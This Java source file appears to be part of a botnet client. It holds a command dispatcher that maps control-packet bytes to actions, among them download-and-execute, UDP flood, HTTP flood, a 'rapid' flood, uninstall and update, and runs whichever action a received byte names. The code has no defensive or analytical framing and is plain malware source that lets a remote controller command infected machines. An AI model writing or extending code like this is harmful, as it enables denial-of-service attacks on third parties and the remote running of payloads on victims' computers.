package commands;
import java.util.HashMap;
import java.util.Map;

import com.redpois0n.common.packets.Headers;



public class Commands {
	
	/**
	 * Command map
	 */
	public static final Map<Byte, Class<? extends Command>> commands = new HashMap<Byte, Class<? extends Command>>();
	
	/**
	 * Loads commands
	 */
	static {
		commands.put(Headers.PACKET_DISCONNECT, CommandDisconnect.class);
		commands.put(Headers.PACKET_DOWNLOAD_EXECUTE, CommandDownload.class);
		commands.put(Headers.PACKET_RECONNECT, CommandReconnect.class);
		commands.put(Headers.PACKET_UDP_FLOOD, CommandUdp.class);
		commands.put(Headers.PACKET_HTTP_FLOOD, CommandHttp.class);
		commands.put(Headers.PACKET_PING, CommandPing.class);
		commands.put(Headers.PACKET_UNINSTALL, CommandUninstall.class);
		commands.put(Headers.PACKET_UPDATE, CommandUpdate.class);
		commands.put(Headers.PACKET_RAPID_FLOOD, CommandRapid.class);
		commands.put(Headers.PACKET_LOG_PING, CommandLogPing.class);
	}

	/**
	 * Executes command from byte
	 * @param b
	 * @throws Exception if no class is found
	 */
	public static void execute(byte b) throws Exception {
		commands.get(b).newInstance().perform();
	}

}
